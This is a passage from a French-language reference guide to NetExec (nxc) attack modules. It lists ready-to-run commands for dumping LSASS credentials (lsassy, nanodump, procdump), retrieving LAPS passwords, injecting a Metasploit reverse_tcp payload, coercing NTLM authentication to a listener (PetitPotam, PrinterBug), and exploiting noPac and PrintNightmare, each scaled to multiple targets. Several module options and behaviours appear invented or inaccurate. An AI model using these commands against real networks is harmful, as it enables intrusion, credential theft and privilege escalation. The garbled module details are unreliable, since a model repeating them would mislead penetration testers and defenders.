nxc smb targets.txt -M impersonate -o USER=john.doe,OUTPUT=all_impersonate_results.txt
```

**Explication** :

* Compile les résultats de l’usurpation pour toutes les cibles dans un fichier unique.

***

### Module : `install_elevated`

**1. Nom du Module : `install_elevated`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module installe des binaires ou services avec des privilèges élevés sur un hôte cible.

**2. Options / Paramètres**

* `--BINARY` : Chemin local vers le binaire à installer.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M install_elevated -o BINARY=/path/to/binary.exe
```

**Explication** :

* Installe le binaire spécifié avec des privilèges élevés sur la cible.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M install_elevated -o BINARY=/path/to/binary.exe,OUTPUT=install_results.txt
```

**Explication** :

* Sauvegarde les résultats de l’installation dans `install_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M install_elevated -o BINARY=/path/to/binary.exe,OUTPUT=all_install_results.txt
```

**Explication** :

* Compile les résultats des installations sur toutes les cibles dans un fichier unique.

***

### Module : `ioxidresolver`

**1. Nom du Module : `ioxidresolver`**

* **Protocole pris en charge** : RPC
* **Description** : Ce module interroge l’interface IObjectExporter pour énumérer les informations liées à l’OXID et les interfaces RPC enregistrées.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc rpc 192.168.1.10 -u admin -p 'password' -M ioxidresolver
```

**Explication** :

* Interroge l’interface RPC IObjectExporter sur la cible pour collecter les informations OXID.

**Commande avec fichier de sortie** :

```
nxc rpc 192.168.1.10 -u admin -p 'password' -M ioxidresolver -o OUTPUT=oxid_info.txt
```

**Explication** :

* Sauvegarde les informations collectées dans `oxid_info.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc rpc targets.txt -M ioxidresolver -o OUTPUT=all_oxid_info.txt
```

**Explication** :

* Compile les informations OXID de toutes les cibles dans un fichier unique.

***

### Module : `keepass_discover`

**1. Nom du Module : `keepass_discover`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module recherche les fichiers KeePass sur une cible distante.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M keepass_discover
```

**Explication** :

* Recherche les fichiers KeePass sur la cible distante.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M keepass_discover -o OUTPUT=keepass_files.txt
```

**Explication** :

* Sauvegarde les résultats dans `keepass_files.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M keepass_discover -o OUTPUT=all_keepass_files.txt
```

**Explication** :

* Compile les fichiers KeePass trouvés sur toutes les cibles dans un fichier unique.

***

### Module : `keepass_trigger`

**1. Nom du Module : `keepass_trigger`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module utilise une commande personnalisée pour tenter d’accéder aux fichiers KeePass détectés.

**2. Options / Paramètres**

* `--FILE` : Chemin du fichier KeePass cible.
* `--COMMAND` : Commande à exécuter pour accéder au fichier.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M keepass_trigger -o FILE=C:\\path\\to\\keepass.kdbx,COMMAND="open"
```

**Explication** :

* Exécute la commande pour accéder au fichier KeePass spécifié.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M keepass_trigger -o FILE=C:\\path\\to\\keepass.kdbx,COMMAND="open"
```

**Explication** :

* Tente d’accéder au fichier KeePass sur plusieurs cibles à l’aide de la commande spécifiée.

***

### Module : `laps`

**1. Nom du Module : `laps`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module récupère les mots de passe LAPS (Local Administrator Password Solution) configurés sur les machines du domaine.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les mots de passe récupérés.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M laps
```

**Explication** :

* Récupère les mots de passe LAPS sur le domaine Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M laps -o OUTPUT=laps_passwords.txt
```

**Explication** :

* Sauvegarde les mots de passe récupérés dans `laps_passwords.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M laps -o OUTPUT=all_laps_passwords.txt
```

**Explication** :

* Compile les mots de passe LAPS de toutes les cibles dans un fichier unique.

***

### Module : `ldap-checker`

**1. Nom du Module : `ldap-checker`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module effectue des vérifications de base sur la configuration LDAP pour identifier les erreurs potentielles.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats des vérifications.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M ldap-checker
```

**Explication** :

* Vérifie les configurations LDAP sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M ldap-checker -o OUTPUT=ldap_check.txt
```

**Explication** :

* Sauvegarde les résultats des vérifications dans `ldap_check.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M ldap-checker -o OUTPUT=all_ldap_checks.txt
```

**Explication** :

* Compile les vérifications LDAP pour toutes les cibles dans un fichier unique.

***

### Module : `link_enable_xp`

**1. Nom du Module : `link_enable_xp`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module permet d'activer des fonctionnalités spécifiques pour les liens inter-serveurs sur des environnements utilisant d'anciennes versions de Windows (XP/2003).

**2. Options / Paramètres**

* `--LINK` : Nom du lien cible à activer.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M link_enable_xp -o LINK=example-link
```

**Explication** :

* Active le lien inter-serveur `example-link` sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M link_enable_xp -o LINK=example-link,OUTPUT=link_activation.txt
```

**Explication** :

* Sauvegarde les résultats de l'activation dans `link_activation.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M link_enable_xp -o LINK=example-link,OUTPUT=all_link_activations.txt
```

**Explication** :

* Active le lien pour toutes les cibles définies dans le fichier et compile les résultats.

***

### Module : `link_xpcmd`

**1. Nom du Module : `link_xpcmd`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module exécute des commandes personnalisées sur des liens inter-serveurs configurés pour des environnements XP/2003.

**2. Options / Paramètres**

* `--LINK` : Nom du lien cible pour exécuter la commande.
* `--COMMAND` : Commande à exécuter sur le lien spécifié.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M link_xpcmd -o LINK=example-link,COMMAND="ipconfig"
```

**Explication** :

* Exécute la commande `ipconfig` sur le lien `example-link` de la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M link_xpcmd -o LINK=example-link,COMMAND="ipconfig",OUTPUT=cmd_results.txt
```

**Explication** :

* Sauvegarde les résultats de la commande dans `cmd_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M link_xpcmd -o LINK=example-link,COMMAND="netstat",OUTPUT=all_cmd_results.txt
```

**Explication** :

* Exécute la commande sur toutes les cibles définies et compile les résultats dans un fichier unique.

***

### Module : `lsassy`

**1. Nom du Module : `lsassy`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module extrait les informations d'identification depuis la mémoire LSASS d'une cible Windows.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les informations d'identification.
* `--VERBOSE` : Active une sortie détaillée.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M lsassy
```

**Explication** :

* Extrait les informations d'identification de la mémoire LSASS de la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M lsassy -o OUTPUT=lsass_dump.txt
```

**Explication** :

* Sauvegarde les informations d'identification extraites dans `lsass_dump.txt`.

**4. Commandes Avancées**

Commande avec sortie détaillée et multi-cibles :

```
nxc smb targets.txt -M lsassy -o OUTPUT=all_lsass_dumps.txt,VERBOSE=1
```

**Explication** :

* Fournit une sortie détaillée des informations d'identification extraites sur toutes les cibles définies.

***

### Module : `maq`

**1. Nom du Module : `maq`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module vérifie les valeurs de la MachineAccountQuota sur un domaine Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M maq
```

**Explication** :

* Vérifie la valeur de MachineAccountQuota sur le domaine Active Directory cible.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M maq -o OUTPUT=maq_results.txt
```

**Explication** :

* Sauvegarde les résultats de l'analyse MachineAccountQuota dans `maq_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M maq -o OUTPUT=all_maq_results.txt
```

**Explication** :

* Compile les résultats MachineAccountQuota pour toutes les cibles dans un fichier unique.

***

### Module : `masky`

**1. Nom du Module : `masky`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module interroge Active Directory pour rechercher des comptes de service configurés avec des mots de passe en texte clair.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M masky
```

**Explication** :

* Rechercher les comptes de service avec des mots de passe en texte clair sur le domaine cible.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M masky -o OUTPUT=service_passwords.txt
```

**Explication** :

* Sauvegarde les résultats dans `service_passwords.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M masky -o OUTPUT=all_service_passwords.txt
```

**Explication** :

* Compile les résultats pour toutes les cibles dans un fichier unique.

***

### Module : `met_inject`

**1. Nom du Module : `met_inject`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module injecte une charge utile Metasploit directement dans un processus cible.

**2. Options / Paramètres**

* `--PAYLOAD` : Charge utile Metasploit à injecter.
* `--PROCESS` : Nom du processus cible.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M met_inject -o PAYLOAD=reverse_tcp,PROCESS=explorer.exe
```

**Explication** :

* Injecte la charge utile `reverse_tcp` dans le processus `explorer.exe` sur la cible.

**4. Commandes Avancées**

Commande multi-cibles avec configuration avancée :

```
nxc smb targets.txt -M met_inject -o PAYLOAD=reverse_tcp,PROCESS=svchost.exe
```

**Explication** :

* Injecte la charge utile dans le processus spécifié sur plusieurs cibles simultanément.

***

### Module : `mobaxterm`

**1. Nom du Module : `mobaxterm`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module recherche et extrait les informations de configuration de l'application MobaXterm sur une cible.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les configurations extraites.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M mobaxterm
```

**Explication** :

* Recherche les fichiers de configuration MobaXterm sur la cible et extrait les informations pertinentes.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M mobaxterm -o OUTPUT=mobaxterm_config.txt
```

**Explication** :

* Sauvegarde les configurations extraites dans `mobaxterm_config.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M mobaxterm -o OUTPUT=all_mobaxterm_configs.txt
```

**Explication** :

* Compile les configurations MobaXterm de toutes les cibles dans un fichier unique.

***

### Module : `mremoteng`

**1. Nom du Module : `mremoteng`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module recherche et extrait les configurations enregistrées de l'application mRemoteNG sur une cible.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les configurations extraites.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M mremoteng
```

**Explication** :

* Recherche les fichiers de configuration mRemoteNG sur la cible et extrait les informations pertinentes.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M mremoteng -o OUTPUT=mremoteng_config.txt
```

**Explication** :

* Sauvegarde les configurations extraites dans `mremoteng_config.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M mremoteng -o OUTPUT=all_mremoteng_configs.txt
```

**Explication** :

* Compile les configurations mRemoteNG de toutes les cibles dans un fichier unique.

***

### Module : `ms17-010`

**1. Nom du Module : `ms17-010`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module détecte la vulnérabilité EternalBlue (MS17-010) sur des cibles Windows.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M ms17-010
```

**Explication** :

* Vérifie si la cible est vulnérable à MS17-010.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M ms17-010 -o OUTPUT=ms17-010_results.txt
```

**Explication** :

* Sauvegarde les résultats de l'analyse dans `ms17-010_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M ms17-010 -o OUTPUT=all_ms17-010_results.txt
```

**Explication** :

* Compile les résultats de l'analyse MS17-010 pour toutes les cibles dans un fichier unique.

***

### Module : `msol`

**1. Nom du Module : `msol`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module énumère les informations liées aux comptes Office 365 configurés dans un environnement hybride Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M msol
```

**Explication** :

* Liste les comptes Office 365 synchronisés avec Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M msol -o OUTPUT=msol_accounts.txt
```

**Explication** :

* Sauvegarde les informations sur les comptes Office 365 dans `msol_accounts.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M msol -o OUTPUT=all_msol_accounts.txt
```

**Explication** :

* Compile les informations sur les comptes Office 365 pour toutes les cibles dans un fichier unique.

***

### Module : `mssql_coerce`

**1. Nom du Module : `mssql_coerce`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module exploite les fonctionnalités SQL Server pour forcer une authentification NTLM sur un autre hôte.

**2. Options / Paramètres**

* `--LISTEN` : Adresse IP de l’hôte écouteur pour capturer les tentatives d’authentification.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M mssql_coerce -o LISTEN=192.168.1.20
```

**Explication** :

* Force la cible à s’authentifier sur l’hôte `192.168.1.20`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M mssql_coerce -o LISTEN=192.168.1.20
```

**Explication** :

* Applique la coercition NTLM sur plusieurs cibles spécifiées.

***

### Module : `mssql_priv`

**1. Nom du Module : `mssql_priv`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module vérifie et exploite les privilèges SQL Server pour exécuter des commandes arbitraires sur la cible.

**2. Options / Paramètres**

* `--COMMAND` : Commande à exécuter sur SQL Server.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M mssql_priv -o COMMAND="xp_cmdshell 'whoami'"
```

**Explication** :

* Exécute la commande `whoami` via SQL Server sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M mssql_priv -o COMMAND="xp_cmdshell 'dir'",OUTPUT=cmd_results.txt
```

**Explication** :

* Sauvegarde les résultats de la commande dans `cmd_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M mssql_priv -o COMMAND="xp_cmdshell 'netstat'",OUTPUT=all_results.txt
```

**Explication** :

* Exécute une commande via SQL Server sur plusieurs cibles simultanément.

***

### Module : `nanodump`

**1. Nom du Module : `nanodump`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module extrait un dump de la mémoire LSASS en utilisant une approche légère et furtive.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer le dump.
* `--VERBOSE` : Active une sortie détaillée.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M nanodump
```

**Explication** :

* Extrait un dump de la mémoire LSASS de la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M nanodump -o OUTPUT=lsass_dump.dmp
```

**Explication** :

* Sauvegarde le dump extrait dans `lsass_dump.dmp`.

**4. Commandes Avancées**

Commande avec sortie détaillée et multi-cibles :

```
nxc smb targets.txt -M nanodump -o OUTPUT=all_dumps.zip,VERBOSE=1
```

**Explication** :

* Fournit une sortie détaillée pour chaque cible et regroupe les dumps dans un fichier compressé.

***

### Module : `nopac`

**1. Nom du Module : `nopac`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module exploite la vulnérabilité "No PAC" pour obtenir des privilèges élevés sur un domaine Active Directory.

**2. Options / Paramètres**

* `--TARGET` : Hôte cible à exploiter.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M nopac -o TARGET=example.local
```

**Explication** :

* Exploite la vulnérabilité "No PAC" sur la cible `example.local`.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M nopac -o TARGET=example.local,OUTPUT=nopac_results.txt
```

**Explication** :

* Sauvegarde les résultats de l'exploitation dans `nopac_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M nopac -o OUTPUT=all_nopac_results.txt
```

**Explication** :

* Compile les résultats de l'exploitation pour toutes les cibles définies dans un fichier unique.

***

### Module : `notepad++`

**1. Nom du Module : `notepad++`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module extrait les configurations et sessions enregistrées de Notepad++ sur un hôte cible.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les configurations extraites.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M notepad++
```

**Explication** :

* Extrait les informations de configuration de Notepad++ sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M notepad++ -o OUTPUT=notepad_config.txt
```

**Explication** :

* Sauvegarde les configurations extraites dans `notepad_config.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M notepad++ -o OUTPUT=all_notepad_configs.txt
```

**Explication** :

* Compile les informations de configuration pour toutes les cibles dans un fichier unique.

***

### Module : `ntdsutil`

**1. Nom du Module : `ntdsutil`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module exploite l'outil NTDSUtil pour extraire des informations sensibles d'Active Directory.

**2. Options / Paramètres**

* `--COMMAND` : Commande NTDSUtil à exécuter.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M ntdsutil -o COMMAND="metadata cleanup"
```

**Explication** :

* Exécute la commande NTDSUtil spécifiée sur la cible.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M ntdsutil -o COMMAND="list roles",OUTPUT=ntdsutil_results.txt
```

**Explication** :

* Sauvegarde les résultats dans `ntdsutil_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M ntdsutil -o COMMAND="list roles",OUTPUT=all_ntdsutil_results.txt
```

**Explication** :

* Compile les résultats de NTDSUtil pour toutes les cibles dans un fichier unique.

***

### Module : `ntlmv1`

**1. Nom du Module : `ntlmv1`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module capture et tente de casser les réponses NTLMv1 pour obtenir des informations d'identification.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les réponses capturées.
* `--CRACK` : Active le cassage des réponses capturées.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M ntlmv1
```

**Explication** :

* Capture les réponses NTLMv1 sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M ntlmv1 -o OUTPUT=ntlmv1_responses.txt
```

**Explication** :

* Sauvegarde les réponses capturées dans `ntlmv1_responses.txt`.

**Commande avec cassage des réponses** :

```
nxc smb 192.168.1.10 -M ntlmv1 -o CRACK=true
```

**Explication** :

* Tente de casser les réponses capturées pour révéler les mots de passe.

**4. Commandes Avancées**

Commande multi-cibles avec sortie globale :

```
nxc smb targets.txt -M ntlmv1 -o OUTPUT=all_ntlmv1_responses.txt,CRACK=true
```

**Explication** :

* Capture et casse les réponses NTLMv1 pour toutes les cibles définies.

***

### Module : `obsolete`

**1. Nom du Module : `obsolete`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module identifie les systèmes obsolètes ou non supportés dans un domaine Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M obsolete
```

**Explication** :

* Analyse le domaine pour identifier les systèmes obsolètes.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M obsolete -o OUTPUT=obsolete_systems.txt
```

**Explication** :

* Sauvegarde la liste des systèmes obsolètes dans `obsolete_systems.txt`.

**4. Commandes Avancées**

Commande multi-cibles avec sortie globale :

```
nxc ldap targets.txt -M obsolete -o OUTPUT=all_obsolete_systems.txt
```

**Explication** :

* Compile les résultats pour toutes les cibles définies.

***

### Module : `petitpotam`

**1. Nom du Module : `petitpotam`**

* **Protocole pris en charge** : RPC
* **Description** : Ce module exploite la vulnérabilité PetitPotam pour forcer l’authentification NTLM sur un hôte.

**2. Options / Paramètres**

* `--TARGET` : Hôte cible à exploiter.
* `--LISTEN` : Adresse IP de l’hôte écouteur pour capturer les tentatives d’authentification.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc rpc 192.168.1.10 -M petitpotam -o TARGET=example.local,LISTEN=192.168.1.20
```

**Explication** :

* Force l’hôte cible à s’authentifier sur l’hôte écouteur spécifié.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc rpc targets.txt -M petitpotam -o LISTEN=192.168.1.20
```

**Explication** :

* Applique l’exploitation sur plusieurs cibles et capture les authentifications.

***

### Module : `pi`

**1. Nom du Module : `pi`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module exécute des commandes personnalisées sur des cibles utilisant des scripts préconfigurés.

**2. Options / Paramètres**

* `--SCRIPT` : Chemin vers le script à exécuter.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M pi -o SCRIPT=/path/to/script.sh
```

**Explication** :

* Exécute le script spécifié sur la cible.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M pi -o SCRIPT=/path/to/script.sh,OUTPUT=pi_results.txt
```

**Explication** :

* Sauvegarde les résultats de l’exécution dans `pi_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M pi -o SCRIPT=/path/to/script.sh,OUTPUT=all_pi_results.txt
```

**Explication** :

* Exécute le script sur plusieurs cibles simultanément et compile les résultats.

***

### Module : `powershell_history`

**1. Nom du Module : `powershell_history`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module récupère l'historique des commandes PowerShell exécutées sur un hôte cible.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer l'historique récupéré.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M powershell_history
```

**Explication** :

* Extrait l'historique des commandes PowerShell sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M powershell_history -o OUTPUT=powershell_history.txt
```

**Explication** :

* Sauvegarde l'historique extrait dans `powershell_history.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M powershell_history -o OUTPUT=all_powershell_histories.txt
```

**Explication** :

* Compile l'historique des commandes pour toutes les cibles dans un fichier unique.

***

### Module : `pre2k`

**1. Nom du Module : `pre2k`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module identifie les objets dans Active Directory utilisant des permissions héritées de l'ère Windows 2000 ou antérieure.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M pre2k
```

**Explication** :

* Analyse le domaine Active Directory pour détecter les permissions héritées obsolètes.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M pre2k -o OUTPUT=pre2k_objects.txt
```

**Explication** :

* Sauvegarde les objets identifiés dans `pre2k_objects.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M pre2k -o OUTPUT=all_pre2k_objects.txt
```

**Explication** :

* Compile les objets hérités pour toutes les cibles dans un fichier unique.

***

### Module : `printerbug`

**1. Nom du Module : `printerbug`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module exploite la vulnérabilité "PrinterBug" pour forcer une authentification NTLM sur un hôte écouteur.

**2. Options / Paramètres**

* `--LISTEN` : Adresse IP de l’hôte écouteur pour capturer les tentatives d’authentification.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M printerbug -o LISTEN=192.168.1.20
```

**Explication** :

* Force la cible à s'authentifier sur l’hôte écouteur spécifié.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M printerbug -o LISTEN=192.168.1.20
```

**Explication** :

* Applique l’exploitation sur plusieurs cibles et capture les authentifications.

***

### Module : `printnightmare`

**1. Nom du Module : `printnightmare`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module exploite la vulnérabilité "PrintNightmare" pour exécuter des commandes arbitraires avec des privilèges élevés sur un hôte cible.

**2. Options / Paramètres**

* `--COMMAND` : Commande à exécuter.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M printnightmare -o COMMAND="whoami"
```

**Explication** :

* Exécute la commande `whoami` avec des privilèges élevés sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M printnightmare -o COMMAND="dir",OUTPUT=printnightmare_results.txt
```

**Explication** :

* Sauvegarde les résultats dans `printnightmare_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M printnightmare -o COMMAND="ipconfig",OUTPUT=all_results.txt
```

**Explication** :

* Exécute une commande arbitraire sur plusieurs cibles et compile les résultats.

***

### Module : `procdump`

**1. Nom du Module : `procdump`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module utilise l'outil Sysinternals ProcDump pour extraire un dump de processus sur une cible.

**2. Options / Paramètres**

* `--PROCESS` : Nom ou ID du processus à dumper.
* `--OUTPUT` : Fichier de sortie pour enregistrer le dump.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M procdump -o PROCESS=lsass
```

**Explication** :

* Crée un dump du processus `lsass` sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M procdump -o PROCESS=lsass,OUTPUT=lsass.dmp
```

**Explication** :

* Sauvegarde le dump du processus dans le fichier `lsass.dmp`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M procdump -o PROCESS=explorer,OUTPUT=all_dumps.zip
```

**Explication** :

* Extrait les dumps du processus `explorer` sur toutes les cibles et les regroupe dans un fichier compressé.

***

### Module : `pso`

**1. Nom du Module : `pso`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module analyse les objets PSO (Password Settings Object) dans Active Directory pour extraire les configurations de politique de mot de passe.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les configurations extraites.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M pso
```

**Explication** :

* Liste les objets PSO et leurs configurations associées dans Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M pso -o OUTPUT=pso_configs.txt
```

**Explication** :

* Sauvegarde les configurations dans `pso_configs.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M pso -o OUTPUT=all_pso_configs.txt
```

**Explication** :

